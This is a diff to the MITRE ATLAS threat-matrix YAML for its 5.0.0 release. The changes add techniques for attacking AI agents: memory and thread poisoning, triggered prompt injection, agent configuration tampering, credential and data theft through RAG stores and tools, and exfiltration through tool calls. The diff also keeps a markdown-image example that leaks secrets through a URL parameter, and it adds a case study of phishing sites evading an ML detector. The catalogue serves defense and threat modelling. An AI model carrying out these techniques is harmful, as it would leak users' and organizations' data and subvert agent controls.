@@ -1,7 +1,7 @@
 ---
 id: ATLAS
 name: Adversarial Threat Landscape for AI Systems
-version: 4.9.1
+version: 5.0.0
 matrices:
 - id: ATLAS
   name: ATLAS Matrix
@@ -1553,7 +1553,7 @@ matrices:
     subtechnique-of: AML.T0043
     created_date: 2021-05-13
     modified_date: 2021-05-13
-    maturity: demonstrated
+    maturity: realized
   - id: AML.T0043.004
     name: Insert Backdoor Trigger
     description: 'The adversary may add a perceptual trigger into inference data.
@@ -1632,7 +1632,7 @@ matrices:
     subtechnique-of: AML.T0048
     created_date: 2023-10-25
     modified_date: 2023-10-25
-    maturity: demonstrated
+    maturity: realized
   - id: AML.T0048.004
     name: AI Intellectual Property Theft
     description: 'Adversaries may exfiltrate AI artifacts to steal intellectual property
@@ -1732,12 +1732,13 @@ matrices:
       This type of injection can be used by the adversary to a foothold on the system
       or to target the user of the LLM.
 
-      '
+      Malicious prompts may also be [Triggered](/techniques/AML.T0051.002) by user
+      inputs defined by the adversary.'
     object-type: technique
     tactics:
     - AML.TA0005
     created_date: 2023-10-25
-    modified_date: 2025-03-12
+    modified_date: 2025-09-30
     maturity: demonstrated
   - id: AML.T0051.000
     name: Direct
@@ -1792,7 +1793,7 @@ matrices:
     - AML.TA0004
     created_date: 2023-10-25
     modified_date: 2023-10-25
-    maturity: demonstrated
+    maturity: realized
   - id: AML.T0052.000
     name: Spearphishing via Social Engineering LLM
     description: 'Adversaries may turn LLMs into targeted social engineers.
@@ -1814,33 +1815,25 @@ matrices:
     modified_date: 2023-10-25
     maturity: demonstrated
   - id: AML.T0053
-    name: LLM Plugin Compromise
-    description: 'Adversaries may use their access to an LLM that is part of a larger
-      system to compromise connected plugins.
-
-      LLMs are often connected to other services or resources via plugins to increase
-      their capabilities.
-
-      Plugins may include integrations with other applications, access to public or
-      private data sources, and the ability to execute code.
+    name: AI Agent Tool Invocation
+    description: 'Adversaries may use their access to an AI agent to invoke tools
+      the agent has access to. LLMs are often connected to other services or resources
+      via tools to increase their capabilities. Tools may include integrations with
+      other applications, access to public or private data sources, and the ability
+      to execute code.
 
 
       This may allow adversaries to execute API calls to integrated applications or
-      plugins, providing the adversary with increased privileges on the system.
-
-      Adversaries may take advantage of connected data sources to retrieve sensitive
-      information.
-
+      services, providing the adversary with increased privileges on the system. Adversaries
+      may take advantage of connected data sources to retrieve sensitive information.
       They may also use an LLM integrated with a command or script interpreter to
-      execute arbitrary instructions.
-
-      '
+      execute arbitrary instructions.'
     object-type: technique
     tactics:
     - AML.TA0005
     - AML.TA0012
     created_date: 2023-10-25
-    modified_date: 2023-10-25
+    modified_date: 2025-09-30
     maturity: demonstrated
   - id: AML.T0054
     name: LLM Jailbreak
@@ -2379,38 +2372,25 @@ matrices:
     maturity: realized
   - id: AML.T0077
     name: LLM Response Rendering
-    description: 'An adversary may get a large language model (LLM) to respond with
-      private information that is hidden from the user when the response is rendered
-      by the user''s client. The private information is then exfiltrated. This can
-      take the form of rendered images which automatically make a request to an adversary
-      controlled server, or clickable links which require user interaction.
-
-
-      For example, an LLM may produce the following markdown:
-
-      ```
-
-      ![ATLAS](https://atlas.mitre.org/image.png?secrets=private_data)
-
-      ```
-
-
-      Which is rendered by the client as:
-
-      ```
-
-      <img src="https://atlas.mitre.org/image.png?secrets=private_data">
-
-      ```
-
-
-      When the request is received by the adversary''s server hosting the requested
-      image, they receive the contents of the `secrets` query parameter.'
+    description: "An adversary may get a large language model (LLM) to respond with\
+      \ private information that is hidden from the user when the response is rendered\
+      \ by the user's client. The private information is then exfiltrated. This can\
+      \ take the form of rendered images, which automatically make a request to an\
+      \ adversary controlled server. \n\nThe adversary gets AI to present an image\
+      \ to the user, which is rendered by the user's client application with no user\
+      \ clicks required. The image is hosted on an attacker-controlled website, allowing\
+      \ the adversary to exfiltrate data through image request parameters. Variants\
+      \ include HTML tags and markdown\n\nFor example, an LLM may produce the following\
+      \ markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private\
+      \ data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"\
+      private data\">\n```\n\nWhen the request is received by the adversary's server\
+      \ hosting the requested image, they receive the contents of the `secrets` query\
+      \ parameter."
     object-type: technique
     tactics:
     - AML.TA0010
     created_date: 2025-04-15
-    modified_date: 2025-04-22
+    modified_date: 2025-04-15
     maturity: demonstrated
   - id: AML.T0008.004
     name: Serverless
@@ -2422,18 +2402,18 @@ matrices:
 
 
       Once acquired, the serverless runtime environment can be leveraged to either
-      respond directly to infected machines or to proxy traffic to an adversary-owned
+      respond directly to infected machines or to Proxy traffic to an adversary-owned
       command and control server. As traffic generated by these functions will appear
       to come from subdomains of common cloud providers, it may be difficult to distinguish
       from ordinary traffic to these providers. This can be used to bypass a Content
-      Security Policy that prevents retrieving content from arbitrary locations.'
+      Security Policy which prevent retrieving content from arbitrary locations.'
     object-type: technique
     ATT&CK-reference:
       id: T1583.007
       url: https://attack.mitre.org/techniques/T1583/007/
     subtechnique-of: AML.T0008
     created_date: 2025-04-15
-    modified_date: 2025-04-21
+    modified_date: 2025-04-15
     maturity: feasible
   - id: AML.T0078
     name: Drive-by Compromise
@@ -2444,7 +2424,7 @@ matrices:
 
 
       The same approach may be used to deliver other types of malicious code that
-      don''t target AI directly (see [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).'
+      don''t target AI directly (See [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).'
     object-type: technique
     ATT&CK-reference:
       id: T1189
@@ -2452,7 +2432,7 @@ matrices:
     tactics:
     - AML.TA0004
     created_date: 2025-04-16
-    modified_date: 2025-04-21
+    modified_date: 2025-04-17
     maturity: demonstrated
   - id: AML.T0079
     name: Stage Capabilities
@@ -2469,7 +2449,7 @@ matrices:
 
       Adversaries may stage a variety of AI Artifacts including poisoned datasets
       ([Publish Poisoned Datasets](/techniques/AML.T0019), malicious models ([Publish
-      Poisoned Models](/techniques/AML.T0058)), and prompt injections. They may target
+      Poisoned Models](/techniques/AML.T0058), and prompt injections. They may target
       names of legitimate companies or products, engage in typosquatting, or use hallucinated
       entities ([Discover LLM Hallucinations](/techniques/AML.T0062)).'
     object-type: technique
@@ -2479,8 +2459,243 @@ matrices:
     tactics:
     - AML.TA0003
     created_date: 2025-04-16
-    modified_date: 2025-04-21
+    modified_date: 2025-04-17
     maturity: demonstrated
+  - id: AML.T0080
+    name: AI Agent Context Poisoning
+    description: 'Adversaries may attempt to manipulate the context used by an AI
+      agent''s large language model (LLM) to influence the responses it generates
+      or actions it takes. This allows an adversary to persistently change the behavior
+      of the target agent and further their goals.
+
+
+      Context poisoning can be accomplished by prompting the an LLM to add instructions
+      or preferences to memory (See Memory) or by simply prompting an LLM that uses
+      prior messages in a thread as part of its context (See [Thread](/techniques/AML.T0080.001)).'
+    object-type: technique
+    tactics:
+    - AML.TA0006
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0080.000
+    name: Memory
+    description: "Adversaries may manipulate the memory of a large language model\
+      \ (LLM) in order to persist changes to the LLM to future chat sessions. \n\n\
+      Memory is a common feature in LLMs that allows them to remember information\
+      \ across chat sessions by utilizing a user-specific database. Because the memory\
+      \ is controlled via normal conversations with the user (e.g. \"remember my preference\
+      \ for ...\") an adversary can inject memories via Direct or Indirect Prompt\
+      \ Injection. Memories may contain malicious instructions (e.g. instructions\
+      \ that leak private conversations) or may promote the adversary's hidden agenda\
+      \ (e.g. manipulating the user)."
+    object-type: technique
+    subtechnique-of: AML.T0080
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0080.001
+    name: Thread
+    description: 'Adversaries may introduce malicious instructions into a chat thread
+      of a large language model (LLM) to cause behavior changes which persist for
+      the remainder of the thread. A chat thread may continue for an extended period
+      over multiple sessions.
+
+
+      The malicious instructions may be introduced via Direct or Indirect Prompt Injection.
+      Direct Injection may occur in cases where the adversary has acquired a user''s
+      LLM API keys and can inject queries directly into any thread.
+
+
+      As the token limits for LLMs rise, AI systems can make use of larger context
+      windows which allow malicious instructions to persist longer in a thread.
+
+      Thread Poisoning may affect multiple users if the LLM is being used in a service
+      with shared threads. For example, if an agent is active in a Slack channel with
+      multiple participants, a single malicious message from one user can influence
+      the agent''s behavior in future interactions with others.'
+    object-type: technique
+    subtechnique-of: AML.T0080
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0081
+    name: Modify AI Agent Configuration
+    description: 'Adversaries may modify the configuration files for AI agents on
+      a system. This allows malicious changes to persist beyond the life of a single
+      agent and affects any agents that share the configuration.
+
+
+      Configuration changes may include modifications to the system prompt, tampering
+      with or replacing knowledge sources, modification to settings of connected tools,
+      and more. Through those changes, an attacker could redirect outputs or tools
+      to malicious services, embed covert instructions that exfiltrate data, or weaken
+      security controls that normally restrict agent behavior.'
+    object-type: technique
+    tactics:
+    - AML.TA0006
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0082
+    name: RAG Credential Harvesting
+    description: Adversaries may attempt to use their access to a large language model
+      (LLM) on the victim's system to collect credentials. Credentials may be stored
+      in internal documents which can inadvertently be ingested into a RAG database,
+      where they can ultimately be retrieved by an AI agent.
+    object-type: technique
+    tactics:
+    - AML.TA0013
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0083
+    name: Credentials from AI Agent Configuration
+    description: 'Adversaries may access the credentials of other tools or services
+      on a system from the configuration of an AI agent. AI agents often utilize external
+      tools or services to take actions.
+
+
+      AI Agents often utilize external tools or services to take actions, such as
+      querying databases, invoking APIs, or interacting with cloud resources. To enable
+      these functions, credentials like API keys, tokens, and connection strings are
+      frequently stored in configuration files. While there are secure methods such
+      as dedicated secret managers or encrypted vaults that can be deployed to store
+      and manage these credentials, in practice they are often placed in less protected
+      locations for convenience or ease of deployment. If an attacker can read or
+      extract these configurations, they may obtain valid credentials that allow direct
+      access to sensitive systems outside the agent itself.'
+    object-type: technique
+    tactics:
+    - AML.TA0013
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0084
+    name: Discover AI Agent Configuration
+    description: 'Adversaries may attempt to discover configuration information for
+      AI agents present on the victim''s system. Agent configurations can include
+      tools or services they have access to.
+
+
+      Adversaries may directly access agent configuring dashboards or configuration
+      files. They may also obtain configuration details by prompting the agent with
+      questions such as "What tools do you have access to?"
+
+
+      Adversaries can use the information they discover about AI agents to help with
+      targeting.'
+    object-type: technique
+    tactics:
+    - AML.TA0008
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0084.000
+    name: Embedded Knowledge
+    description: 'Adversaries may attempt to discover the data sources a particular
+      agent can access.  The AI agent''s configuration may reveal data sources or
+      knowledge.
+
+
+      The embedded knowledge may include sensitive or proprietary material such as
+      intellectual property, customer data, internal policies, or even credentials.
+      By mapping what knowledge an agent has access to, an adversary can better understand
+      the AI agent''s role and potentially expose confidential information or pinpoint
+      high-value targets for further exploitation.'
+    object-type: technique
+    subtechnique-of: AML.T0084
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0084.001
+    name: Tool Definitions
+    description: Adversaries may discover the tools the AI agent has access to. By
+      identifying which tools are available, the adversary can understand what actions
+      may be executed through the agent and what additional resources it can reach.
+      This knowledge may reveal access to external data sources such as OneDrive or
+      SharePoint, or expose exfiltration paths like the ability to send emails, helping
+      adversaries identify AI agents that provide the greatest value or opportunity
+      for attack.
+    object-type: technique
+    subtechnique-of: AML.T0084
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0084.002
+    name: Activation Triggers
+    description: 'Adversaries may discover keywords or other triggers (such as incoming
+      emails, documents being added, incoming message, or other workflows) that activate
+      an agent and may cause it to run additional actions.
+
+
+      Understanding these triggers can reveal how the AI agent is activated and controlled.
+      This may also expose additional paths for compromise, as an adversary could
+      attempt to trigger the agent from outside its environment and drive it to perform
+      unintended or malicious actions.'
+    object-type: technique
+    subtechnique-of: AML.T0084
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0085
+    name: Data from AI Services
+    description: Adversaries may use their access to a victim organization's AI-enabled
+      services to collect proprietary or otherwise sensitive information. As organizations
+      adopt generative AI in centralized services for accessing an organization's
+      data, such as with chat agents which can access retrieval augmented generation
+      (RAG) databases and other data sources via tools, they become increasingly valuable
+      targets for adversaries.
+    object-type: technique
+    tactics:
+    - AML.TA0009
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0085.000
+    name: RAG Databases
+    description: Adversaries may prompt the AI service to retrieve data from a RAG
+      database. This can include the majority of an organization's internal documents.
+    object-type: technique
+    subtechnique-of: AML.T0085
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0085.001
+    name: AI Agent Tools
+    description: Adversaries may prompt the AI service to invoke various tools the
+      agent has access to. Tools may retrieve data from different APIs or services
+      in an organization.
+    object-type: technique
+    subtechnique-of: AML.T0085
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0086
+    name: Exfiltration via AI Agent Tool Invocation
+    description: Adversaries may use prompts to invoke an agent's tool capable of
+      performing write operations to exfiltrate data. Sensitive information can be
+      encoded into the tool's input parameters and transmitted as part of a seemingly
+      legitimate action. Variants include sending emails, creating or modifying documents,
+      updating CRM records, or even generating media such as images or videos.
+    object-type: technique
+    tactics:
+    - AML.TA0010
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
+  - id: AML.T0051.002
+    name: Triggered
+    description: The adversary injects instructions to be followed by the AI system
+      in response to a future event, either a specific keyword or the next interaction.
+      The triggering events can range from simple phrases to complex and covert signals,
+      including encoded or steganographic payloads hidden within seemingly benign
+      content.
+    object-type: technique
+    subtechnique-of: AML.T0051
+    created_date: 2025-09-30
+    modified_date: 2025-09-30
+    maturity: feasible
   mitigations:
   - id: AML.M0000
     name: Limit Public Release of Information
@@ -5652,3 +5867,79 @@ case-studies:
   references:
   - title: Malicious ML models discovered on Hugging Face platform
     url: https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face?&web_view=true
+- id: AML.CS0032
+  name: Attempted Evasion of ML Phishing Webpage Detection System
+  object-type: case-study
+  summary: 'Adversaries create phishing websites that appear visually similar to legitimate
+    sites. These sites are designed to trick users into entering their credentials,
+    which are then sent to the bad actor. To combat this behavior, security companies
+    utilize AI/ML-based approaches to detect phishing sites and block them in their
+    endpoint security products.
+
+
+    In this incident, adversarial examples were identified in the logs of a commercial
+    machine learning phishing website detection system. The detection system makes
+    an automated block/allow determination from the "phishing score" of an ensemble
+    of image classifiers each responsible for different phishing indicators (visual
+    similarity, input form detection, etc.). The adversarial examples appeared to
+    employ several simple yet effective strategies for manually modifying brand logos
+    in an attempt to evade image classification models. The phishing websites which
+    employed logo modification methods successfully evaded the model responsible detecting
+    brand impersonation via visual similarity. However, the other components of the
+    system successfully flagged the phishing websites.'
+  incident-date: 2022-12-01
+  incident-date-granularity: MONTH
+  procedure:
+  - tactic: AML.TA0001
+    technique: AML.T0043.003
+    description: 'Several cheap, yet effective strategies for manually modifying logos
+      were observed:
+
+      | Evasive Strategy | Count |
+
+      | - | - |
+
+      | Company name style | 25 |
+
+      | Blurry logo | 23 |
+
+      | Cropping | 20 |
+
+      | No company name | 16 |
+
+      | No visual logo | 13 |
+
+      | Different visual logo | 12 |
+
+      | Logo stretching | 11 |
+
+      | Multiple forms - images | 10 |
+
+      | Background patterns | 8 |
+
+      | Login obfuscation | 6 |
+
+      | Masking | 3 |'
+  - tactic: AML.TA0007
+    technique: AML.T0015
+    description: The visual similarity model used to detect brand impersonation was
+      evaded. However, other components of the phishing detection system successfully
+      identified the phishing websites.
+  - tactic: AML.TA0004
+    technique: AML.T0052
+    description: If the adversary can successfully evade detection, they can continue
+      to operate their phishing websites and steal the victim's credentials.
+  - tactic: AML.TA0011
+    technique: AML.T0048.003
+    description: The end user may experience a variety of harms including financial
+      and privacy harms depending on the credentials stolen by the adversary.
+  reporter: Norton Research Group (NRG)
+  target: Commercial ML Phishing Webpage Detector
+  actor: Unknown
+  case-study-type: incident
+  references:
+  - title: '"Real Attackers Don''t Compute Gradients": Bridging the Gap Between Adversarial
+      ML Research and Practice'
+    url: https://arxiv.org/abs/2212.14315
+  - title: Real Attackers Don't Compute Gradients Supplementary Resources
+    url: https://real-gradients.github.io/
